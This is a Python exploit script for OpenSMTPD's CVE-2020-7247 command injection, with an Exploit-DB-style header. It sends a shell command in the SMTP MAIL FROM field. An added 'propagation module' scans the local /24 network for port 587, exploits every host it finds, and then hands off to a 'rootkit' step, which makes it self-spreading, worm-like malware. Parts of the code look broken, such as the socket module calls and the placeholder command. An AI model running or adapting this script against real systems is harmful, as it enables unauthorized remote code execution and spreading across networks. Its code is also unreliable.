# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Original Author: Qualys Security Advisory
# Vendor Homepage: https://www.opensmtpd.org/
# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
# Version: OpenSMTPD < 6.6.2
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2020-7247
# References:
# https://www.openwall.com/lists/oss-security/2020/01/28/3
#
# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
# escape dangerous characters from user-controlled input. An attacker
# can exploit this to execute arbitrary shell commands on the target.
# 
#!/usr/local/bin/python3

from socket import *
import nmap
import sys
import struct

def exploit(ADDR, PORT, CMD):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ADDR, PORT))

    res = s.recv(1024)
    if 'OpenSMTPD' not in str(res):
        print('[!] No OpenSMTPD detected')
        print('[!] Received {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] OpenSMTPD detected')
    s.send(b'HELO x\r\n')
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error connecting, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Connected, sending payload')
    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error sending payload, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Payload sent')
    s.send(b'RCPT TO:<root>\r\n')
    s.recv(1024)
    s.send(b'DATA\r\n')
    s.recv(1024)
    s.send(b'\r\nxxx\r\n.\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.recv(1024)
    print('[*] Done')
    
def get_network_range():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    packed_ip = socket.inet_aton(ip_address)
    ip_as_integer = struct.unpack("!I", packed_ip)[0]
    network_mask = 0b11111111111111111111111100000000
    network_address = ip_as_integer & network_mask
    packed_network_address = struct.pack("!I", network_address)
    dotted_network_address = socket.inet_ntoa(packed_network_address)
    network_range = dotted_network_address + '/24'
    return network_range

def scan_network_for_port(port):
    nm = nmap.PortScanner()
    network_range = get_network_range()
    nm.scan(hosts=network_range, arguments=f'-p {port}')

    hosts_list = []
    for host in nm.all_hosts():
        if nm[host].has_tcp(port) and nm[host]['tcp'][port]['state'] == 'open':
            hosts_list.append(host)

    return hosts_list
            
def run():
    next_action = ""
    data = ""
    print("[+] Propagation module activated...")

    cmd = "nano touch miau.txt"  # Replace with your command
    port = 587
    found_hosts = scan_network_for_port(port)

    for host in found_hosts:
        exploit(host, port, cmd)

    next_action = "rootkit"
    return data, next_action
